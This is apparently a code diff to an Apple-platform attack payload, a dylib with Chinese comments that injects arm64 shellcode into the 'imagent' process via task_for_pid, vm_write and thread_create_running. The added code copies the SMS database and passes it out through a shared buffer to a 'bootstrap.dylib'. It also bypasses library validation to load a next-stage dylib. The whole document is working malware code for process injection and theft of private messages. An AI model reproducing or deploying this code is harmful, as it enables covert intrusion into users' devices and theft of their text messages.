@@ -1,6 +1,6 @@
 @import Darwin;
 @import MachO;
-#include <mach-o/ldsyms.h> /* _mh_dylib_header */
+#include <mach-o/ldsyms.h>
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <unistd.h>
@@ -8,8 +8,13 @@
 #include <errno.h>
 #include <sys/sysctl.h>
 #include <mach/mach.h>
+#include <stdlib.h>
 
-// ===== 原始函数指针声明 =====
+// ===== 共享缓冲区协议常量 =====
+#define STATE_IDLE  0
+#define STATE_POST  7
+
+// ===== 函数指针 =====
 extern pthread_t pthread_main_thread_np(void);
 extern void _pthread_set_self(pthread_t p);
 void              (*_abort)(void);
@@ -24,10 +29,12 @@ int               (*_strncmp)(const char *s1, const char *s2, size_t n);
 kern_return_t     (*_thread_terminate)(mach_port_t);
 int               (*_write)(int, const void *, size_t);
 ssize_t           (*_read)(int, void *, size_t);
+void*             (*_malloc)(size_t);
+void              (*_free)(void*);
 
 int dyld_lv_bypass_init(void * (*_dlsym)(void* handle, const char* symbol), const char *next_stage_dylib_path);
 
-// ===== 注入需要的额外函数指针 =====
+// ===== 注入函数指针 =====
 static kern_return_t (*_task_for_pid)(mach_port_t, pid_t, task_t*);
 static kern_return_t (*_vm_allocate)(task_t, vm_address_t*, vm_size_t, int);
 static kern_return_t (*_vm_write)(task_t, vm_address_t, vm_offset_t, mach_msg_type_number_t);
@@ -35,15 +42,17 @@ static kern_return_t (*_vm_protect)(task_t, vm_address_t, vm_size_t, boolean_t, 
 static kern_return_t (*_thread_create_running)(task_t, void*, void*, mach_msg_type_number_t, thread_act_t*);
 static mach_port_t (*_mach_task_self)(void);
 
-// ===== 获取进程 PID =====
+// ===== 全局缓冲区指针（用于回传） =====
+static uint32_t* g_buffer = NULL;
+
+// ===== 获取 PID =====
 static pid_t get_pid(const char *name) {
     int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
     size_t size = 0;
     sysctl(mib, 4, NULL, &size, NULL, 0);
-    struct kinfo_proc *procs = (struct kinfo_proc *)malloc(size);
+    struct kinfo_proc *procs = (struct kinfo_proc *)_malloc(size);
     if (!procs) return -1;
     sysctl(mib, 4, procs, &size, NULL, 0);
-    
     pid_t target = -1;
     int count = size / sizeof(struct kinfo_proc);
     for (int i = 0; i < count; i++) {
@@ -52,11 +61,11 @@ static pid_t get_pid(const char *name) {
             break;
         }
     }
-    free(procs);
+    _free(procs);
     return target;
 }
 
-// ===== 在 imagent 中执行的 shellcode（arm64） =====
+// ===== shellcode =====
 static void remote_shellcode(void) {
     asm volatile(
         "mov x0, %0\n"
@@ -71,6 +80,20 @@ static void remote_shellcode(void) {
     );
 }
 
+// ===== 写入共享缓冲区（回传数据） =====
+static void write_to_buffer(uint32_t* D, const char* type, const uint8_t* data, int size) {
+    if (!D) return;
+    uint8_t* payload = (uint8_t*)(D + 2);
+    int i;
+    for (i = 0; type[i] && i < 32; i++) payload[i] = type[i];
+    payload[i] = '\0';
+    int header_size = i + 1;
+    for (i = 0; i < size && i < 16777216 - 64; i++)
+        payload[header_size + i] = data[i];
+    D[1] = header_size + i;
+    D[0] = STATE_POST;
+}
+
 // ===== 注入 imagent =====
 static void inject_imagent(void) {
     _task_for_pid = _dlsym(RTLD_DEFAULT, "task_for_pid");
@@ -79,34 +102,25 @@ static void inject_imagent(void) {
     _vm_protect = _dlsym(RTLD_DEFAULT, "vm_protect");
     _thread_create_running = _dlsym(RTLD_DEFAULT, "thread_create_running");
     _mach_task_self = _dlsym(RTLD_DEFAULT, "mach_task_self");
-    _open = _dlsym(RTLD_DEFAULT, "open");
-    _close = _dlsym(RTLD_DEFAULT, "close");
-    _write = _dlsym(RTLD_DEFAULT, "write");
-    _read = _dlsym(RTLD_DEFAULT, "read");
     
     if (!_task_for_pid || !_vm_allocate || !_vm_write || !_vm_protect || !_thread_create_running) {
-        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-        if (flag >= 0) { _write(flag, "no_funcs", 8); _close(flag); }
+        int fd = _open("/tmp/sms_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { _write(fd, "no_dlsym", 8); _close(fd); }
         return;
     }
     
     pid_t pid = get_pid("imagent");
     if (pid <= 0) {
-        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-        if (flag >= 0) { _write(flag, "no_pid", 6); _close(flag); }
+        int fd = _open("/tmp/sms_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { _write(fd, "no_pid", 6); _close(fd); }
         return;
     }
     
     task_t remote_task;
     kern_return_t kr = _task_for_pid(_mach_task_self(), pid, &remote_task);
     if (kr != KERN_SUCCESS) {
-        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-        if (flag >= 0) { 
-            char buf[32];
-            snprintf(buf, sizeof(buf), "task_fail_%d", kr);
-            _write(flag, buf, strlen(buf)); 
-            _close(flag); 
-        }
+        int fd = _open("/tmp/sms_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { _write(fd, "task_fail", 9); _close(fd); }
         return;
     }
     
@@ -114,15 +128,15 @@ static void inject_imagent(void) {
     vm_address_t remote_addr;
     kr = _vm_allocate(remote_task, &remote_addr, code_size, VM_FLAGS_ANYWHERE);
     if (kr != KERN_SUCCESS) {
-        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-        if (flag >= 0) { _write(flag, "vm_alloc_fail", 13); _close(flag); }
+        int fd = _open("/tmp/sms_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { _write(fd, "vm_fail", 7); _close(fd); }
         return;
     }
     
     kr = _vm_write(remote_task, remote_addr, (vm_offset_t)remote_shellcode, code_size);
     if (kr != KERN_SUCCESS) {
-        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-        if (flag >= 0) { _write(flag, "vm_write_fail", 13); _close(flag); }
+        int fd = _open("/tmp/sms_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { _write(fd, "write_fail", 10); _close(fd); }
         _vm_protect(remote_task, remote_addr, code_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
     }
     
@@ -131,23 +145,58 @@ static void inject_imagent(void) {
     thread_act_t remote_thread;
     kr = _thread_create_running(remote_task, (void*)remote_addr, NULL, 0, &remote_thread);
     if (kr != KERN_SUCCESS) {
-        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-        if (flag >= 0) { _write(flag, "thread_fail", 11); _close(flag); }
+        int fd = _open("/tmp/sms_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { _write(fd, "thread_fail", 11); _close(fd); }
         return;
     }
     
     sleep(1);
     
     if (access("/tmp/sms_injected.db", F_OK) == 0) {
-        int flag = _open("/tmp/sms_injected_ok", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-        if (flag >= 0) { _write(flag, "ok", 2); _close(flag); }
+        int fd = _open("/tmp/sms_ok", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { _write(fd, "ok", 2); _close(fd); }
     } else {
-        int flag = _open("/tmp/sms_inject_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
-        if (flag >= 0) { _write(flag, "no_file", 7); _close(flag); }
+        int fd = _open("/tmp/sms_fail", O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { _write(fd, "no_file", 7); _close(fd); }
     }
 }
 
-// ===== 原始的 save_section_to_file =====
+// ===== 回传 sms.db =====
+static void exfil_sms(uint32_t* D) {
+    if (!D) return;
+    int fd = _open("/tmp/sms_injected.db", O_RDONLY);
+    if (fd < 0) {
+        const char* msg = "{\"error\":\"open_fail\"}";
+        write_to_buffer(D, "sms", (uint8_t*)msg, (int)strlen(msg));
+        return;
+    }
+    struct stat st;
+    if (fstat(fd, &st) != 0 || st.st_size == 0) {
+        const char* msg = "{\"error\":\"stat_fail\"}";
+        write_to_buffer(D, "sms", (uint8_t*)msg, (int)strlen(msg));
+        _close(fd);
+        return;
+    }
+    size_t file_size = (st.st_size > 10 * 1024 * 1024) ? 10 * 1024 * 1024 : st.st_size;
+    uint8_t* buf = (uint8_t*)_malloc(file_size);
+    if (!buf) {
+        const char* msg = "{\"error\":\"malloc_fail\"}";
+        write_to_buffer(D, "sms", (uint8_t*)msg, (int)strlen(msg));
+        _close(fd);
+        return;
+    }
+    ssize_t n = _read(fd, buf, file_size);
+    _close(fd);
+    if (n > 0) {
+        write_to_buffer(D, "sms", buf, (int)n);
+    } else {
+        const char* msg = "{\"error\":\"read_fail\"}";
+        write_to_buffer(D, "sms", (uint8_t*)msg, (int)strlen(msg));
+    }
+    _free(buf);
+}
+
+// ===== 原始函数 =====
 void save_section_to_file(const char *section, const char *path) {
     size_t dylib_size = 0;
     const char *dylib = (const char *)_getsectiondata((struct mach_header_64 *)&_mh_dylib_header, "__TEXT", section, &dylib_size);
@@ -172,8 +221,13 @@ __attribute__((noinline)) void *pacia(void* ptr, uint64_t ctx) {
 }
 #endif
 
-// ===== 主入口：last() - 执行注入 =====
-int last(void) {
+// ============================================================
+// 主入口：_process（bootstrap.dylib 期望的符号）
+// ============================================================
+__attribute__((visibility("default")))
+void _process(void* buffer) {
+    g_buffer = (uint32_t*)buffer;
+    
 #if __arm64e__
     _dlsym = pacia(dlsym, 0);
     __pthread_set_self = pacia(_pthread_set_self, 0);
@@ -194,20 +248,18 @@ int last(void) {
     _thread_terminate = _dlsym(RTLD_DEFAULT, "thread_terminate");
     _write = _dlsym(RTLD_DEFAULT, "write");
     _read = _dlsym(RTLD_DEFAULT, "read");
+    _malloc = _dlsym(RTLD_DEFAULT, "malloc");
+    _free = _dlsym(RTLD_DEFAULT, "free");
 
+    // 1. 注入 imagent 复制 sms.db
     inject_imagent();
 
+    // 2. 回传数据
+    exfil_sms(g_buffer);
+
+    // 3. 原始逻辑：加载 actual.dylib
     const char *path = save_actual_dylib();
     dyld_lv_bypass_init(_dlsym, path);
 
     _thread_terminate(_mach_thread_self());
-    return 0;
-}
-
-int end(void) {
-    return last();
-}
-
-void _process(void* buffer) {
-    last();
 }
